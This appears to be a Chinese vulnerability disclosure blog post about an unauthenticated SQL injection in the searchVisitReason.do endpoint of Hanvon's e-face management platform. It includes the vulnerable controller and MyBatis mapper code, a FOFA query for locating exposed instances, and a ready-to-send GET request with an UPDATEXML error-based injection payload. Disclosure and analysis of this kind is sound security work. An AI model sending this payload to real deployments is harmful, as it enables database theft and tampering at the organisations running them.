---
title: "汉王e脸通综合管理平台 searchVisitReason.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-searchVisitReason-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-searchvisitreason.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 searchVisitReason.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/1 12:22
- 590浏览
- [0评论](#comment)
- 34分钟阅读

深入探索

应用

身份验证

SQL

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理[软件](#)，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `searchVisitReason.do` 接口存在 [SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入防护

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

直接看 `VisitorConfigManageController` 里关于 `searchVisitReason` 的实现

```
@ResponseBody
    @RequestMapping(
        value = {"/searchVisitReason.do"},
        method = {RequestMethod.GET}
    )
    public RequestJson searchVisitReason(@RequestParam(required = false,value = "visitReasonName") String visitReasonName, @RequestParam(required = false,value = "visitReasonCode") String visitReasonCode, @RequestParam(required = false,value = "page") Integer page, @RequestParam(required = false,value = "pageSize") Integer pageSize, @RequestParam(required = false,value = "columnKey") String columnKey, @RequestParam(required = false,value = "order") String order) {
        RequestJson requestJson = new RequestJson();

        try {
            if (page == null) {
                page = Constants.DEFAULT_START_PAGE_INDEX;
            }

            if (pageSize == null) {
                pageSize = Constants.PAGE_SIZE;
            }

            VisitorMapParam visitorMapParam = new VisitorMapParam();
            visitorMapParam.setVisitReasonCode(visitReasonCode);
            visitorMapParam.setVisitReasonName(visitReasonName);
            visitorMapParam.setOrder(order);
            visitorMapParam.setColumnKey(columnKey);
            PageHelper.startPage(page, pageSize);
            MethodResult<List<VisitReasonTpm>> result = this.visitorConfigAsm.queryVisitorReason(visitorMapParam);
            List<VisitReasonTpm> visitReasonTpmList = (List)result.getResult();
```

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 VisitorConfigDsm.xml

代码安全审计

```
<select id="queryVisitorReason" resultMap="visitReasonMap">
        SELECT ng_id,sz_code,sz_name,ng_creator,ts_create,ts_modify,ng_modify_id
        FROM vis_reason

          WHERE  1 = 1
            <!--<if test="visitorMapParam.visitReason != null">-->
                <!--AND sz_name like CONCAT(CONCAT('%',#{visitorMapParam.visitReason}),'%')-->
            <!--</if>-->
            <if test="visitReasonName != null">
                AND sz_name LIKE CONCAT(CONCAT('%',#{visitReasonName}),'%')
            </if>
            <if test="visitReasonCode != null">
                AND (sz_code LIKE CONCAT(CONCAT('%',#{visitReasonCode}),'%')
                OR sz_name LIKE CONCAT(CONCAT('%',#{visitReasonCode}),'%'))
            </if>
            ORDER BY
            <if test="order == null or order == ''">
                ts_create desc
            </if>
            <if test="order != null and order != ''">
                ${columnKey} ${order}
            </if>

    </select>
```

深入探索

文本剥离工具

编程语言教程

漏洞扫描器

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
GET /manage/visitorConfigManage/searchVisitReason.do?branchId=1&columnKey=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(2920=2920,1)))),8357))&deviceName=test&id=1&order=desc&page=1&pageSize=10&recoToken=SGUsqvF7cVS&type=1&start=2025-06-25&end=2025-06-25&groupId=1 HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 searchVisitReason.do SQL注入漏洞](images/img-001-95b7f062200b.webp)](https://image.mrxn.net/20de18fd57354e489ade1371879bd5b0.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALl0lEQVR4Aeybi3LbyA5EdfL//5wN1D40B5wR5TwsVS1TF2n2A+CEoGInufvjdrv9/J36+fHD3g+6gbqoccbNdVz1qRfaU9dVK971ylapi6XtS72jGXX572At5Fff9b93eQLbQn5t9/ZMrQ4O3IDN7rOAwYeRb43tApJzXrOHM8OYhXB7IByC6s6G6BBUNwfRYUT9jvaf4b5vW8hevK5f9wQOC4Fx+xD+7BEheQj2vtXbAsnDiOadA/G7rj/Dr2Sr3zyM91IXK/tMQebAiLPew0JmoUv7vifwxwvpb4tchLwVv/tLgsf9EB/Yvp5ANM/Q732mQ/rtg3AIqourefpfwT9eyFdudmXPn8A/WwjkbfLtESE6BPsRzXW9czj2w1GrPoi+mg3xK1tlrmN5+9Lfa396/c8W8qcH+7/2Hxbi1juuHhCMb9c99+An5z6I3K2znP4M7wN+/QQ5mxkI/2VN/wfxIWgIwp+dY59oX0f9PR4Wsjev6+9/AttCIG8BPMbVEd0+pL9z+2Dur/L2rRAyDzhE+swVt1Ff/iwCw99C2AfR4TGaL9wWUuSq1z+BH74VX8V+dMhb4BwINwfhK9+cCMmvuLrzCtVWCJlZ2aqeg9GHcHMQXr1V6nVd1XlpX63rE+JTfBM8LATyFsCInheiy0XfBIgvP/PNQfp6Xt4RkocjmoV4cu8lF9VFSJ+85+QiJA9zNCfCPAfcDgu5XT9e+gS2hUC25lvREUYfRu6vwj65CMmveO+D5NVF+59Be0R7ILMhqC6ah9GHkfe8fIWQfufPcFvIasilf+8TWC4Esk2P4zYheucQHUY01+fIRUifeVH/drvdL7sun+G9YfcTPL4HxIegM3cjppeQvKZ9IsTvHKLDJy4X4vALv/cJnC4Esj2P1bfcdfkZrubAeL8+B+Lbv/ch3l6ra4g+6ym/17M5+8yL6ivsOXnh6UJWQy/93zyBHzB/e2pbVf22kLx6Zaogel3vy5wIyclFe+QijPmeg/iALRsC979jsgfCIbgFPy7MfdB7L3z+S+TKh8yDOa761OGz7/qE+PTfBLe/y4JsyXNBuFtUl4uQnD6Ew4jmRYjf+1a+uWcQHs9ezYCxz7OYh9FXNyd2HeZ9PVf91yfEp/ImuFxIbauqnxPm267so4LHff0+nUP6YcT9Pe3Za/tr/RWa1YfcS64Pow4j77nOnSdC+oHr77Jub/Zj+V0WfG4NPq/dtr8OOSSjDiNX7wjP5byP/XJIP6C1fXcE3K834+PC3jud/ATzPpjrfQQk531g5D1vrnD5W1Zvuvj3PIHtuyxvB/Nt1vaqID4E7RMhemWr1FdYmSp9SL+8vCqIXtdV+nssfVZmIDM6h+gQ1BchurPV5SIkpw/h3e/cfOH1Camn8Ea1fQ2BbLOfrW9TLkL65PZDdAjqQ3jPyUXzncPYb67QbEcYeyC8embV++WQvhV3lr4I875Z/vqE+NTeBA8LmW1tf1YYt20e5rq9EN/8GfY+uQiZB+doj/eUQ3o7NyfqyzvqwzhPvaP9kDx84mEhvfni3/sElguBbK0fx+2qQ3JnevftFyFz5GLvk/8OwngPZ8CoQzgEew6iQ3B1VnXROZ2rFy4XYtOF3/sEvrwQyFsBwdpqFYR7/NKq5BAfgl2Xi/BcznwhPO6p8+yreqrU6rqqcxjnVqbKHBz8srcypwDJQ1C98MsLqaar/t0T+PKf1N22CNmy3KNCdAjqi+bErssh/eZg5OqFz/ZAZkCweqvsr+tZ6Ytm5PDcPPOicwqvT0g9hTeq7U/qqzNBtg5zXPW5fdEcZI68++odew4yB45ob+/puj4cZwDGt/+6VwG4/y0yjKgvwtd84Pr3kNub/dh+y/JtWZ1Pv6N5yNugD+H6YvchORjR/AqdM8PeY6brkHvqi+Y6V1+h+Y5n+b2/LWQvXtevewLbd1kwvi0Q3o8Gc923AuJ33ufoi/pyyBx1GHnXAaUlAvff+w14LzmMPoRD0NwZwuM8rP3rE3L2dL/ZvxbyzQ/87HbbQvz4Qj5Oxav6gNKqui4vrwoyRx3mHEbdfM2oWvGu77N6HStTBbknBM2VNyt9sWfURX35CmG8f+W2hRS56vVPYPuDIYzbgjmH6BDsvwSIvnpLIH7vW+XVYeyDcDhinw3JdN3ZXYcx33Mw+vZDdBhRX3SeqF54fULqKbxRbQtxW2I/o3pHc5C3YsXt05eL6iJkHgTVH6GzRJj36q9m6cPYD+H6Z/36qzxknrnCbSFFrnr9Ezj8wbAfqW8XslUI9vyKQ/LOg/BV3tzKVzdXqHaGkHvDiKs+SE4fwiGoXmeoWnFIHoKVrTJfeH1C6im8UR0WAtlePyNEr43uy5yaXOw6ZI4+hMMczTlHVId5H2Bk++tz4OFfnWwNJxf9DJ3bDrkfBNVFiG5/4WEhhi98zRPY/hxS26nyGHVdBeMWIRyClamCcPtX+PPnz+2Nrb5e9nUdMh+Cs5ya6IwVh3EWhEOw9zkP4svNQXQIdt9c1yF54PoHqtub/Th8l+X2IFuTe265CGNO3XxHSF4dRt774bHvnD06A9ILwX2mrs11LK9KHcZ+9cpUwdyHuV49q7q+hqyezIv05deQfh7ItiGo39+Wr+qrfsh9ug9zve7bs6VVqUN6S6uCcAiWti+Ibr8eRIegujmILtdfobnC6xOyekov0reFQLYKwdV5aotV+jDmIRyC5s4QkofgKl/3roLk4BPtgWiVq1IXS9uXurj36lodxrnl7Qvir/Iw+vaaL9wWUuSq1z+B7busvi05ZKudw6j7SzEnF9UhfTBiz8lF+1dc/SsIOYM9EA4j6nsGGH0INyeaX3FIH3zi9Qnxab0Jbt9lQbbUt+o5Ye5DdAia7whzv98PklOHcAj2ueYKIZm6roJwCNoLI6/svsypQfIQ7H7nZ32rfPVdnxCfzpvg9jXE80DeAgjW1vYFc90MxHeeqL/i6h17H2Q+BPf5ntV7VofjTGfs0Xkwz0N0c/ZCdAjO9OsT4lN5E9y+hvTzuF3INiG40mH0zfW5ckgeguorXM2D9MMRe0/nkB7v2X31FZoXIfNW3Dn6nZd+fUJ8Km+Ch68htaUqz1fXVXLIWyAXK1MF8WGO5ldYM6r0IXPkYmWq5M8gjLOqv8peiF9aFYy8tCqIDiM+O6fn4HPO9Qnx6bwJHhYCn9sCtmPWm7EvDTVg+Pdq/Y7mz3R4PA/iO2+GkAwE+z3lMPedaU5UP0PIXHMQ7hxRv/CwEEMXvuYJnH6X1Y8F2XJts0q/rmfVfRj77YHoEFQXndMRkocjmj2boS/aB8eZgPb9dwRgiQYhmT5ff4/XJ2T/NN7gevsuy+2Jq7N1H7J9CK76IP6qX110DqQPgurmZtgzMPbqixAfguodvZf6iquL5jvO/OsT0p/Si/n2NQTydsBz6Lndsgjp774cRr/rMPedb16E5AGlDYH77+8KzhBh7pvvCGO++3KY52DUIRw+8fqE+BTfBLeF+Nac4erckC3rQzgEnav/t9C5hauZ5VXpQ84k7wjxq2df5iA+BNVFe+Ri1+V73BZi04WvfQKHhUC2DiOujgnJdX+/9bruPsz7eq56q2DMQzgcsc/ovOZVqdd1FWSWughzXV+E5GBEfRHW/mEhNl34mifw1xZSb1jV6pcBeStWvnrNqIKv5avHcpYImQUj6nd0DiQvN/cs7zn71UXIfYDr//1+e7Mff+0TAtmyvz4YuW+Dvrxj98845D6A0Yf//Um/X/Gt8eMCGP788iFvcyF+9VbByM3DqEN49+WFf20hNeyqP38Ch4XUxme1upVZ/c5hfCvMQXSYo7mOzof0yQshGjyHzobka8aseu6MQ+aZW6H32vuHhezN6/r7n8C2EMhW4TGujjjbdmW7/iyH+TlqZlWfs9f0xPJmBbmHOQiHOfYZ9qnLRfWOMM7f+9tC9uJ1/boncC3kdc9+euf/AAAA//83NVGaAAAABklEQVQDAGponctsZAn+AAAAAElFTkSuQmCC)

手机扫码阅读
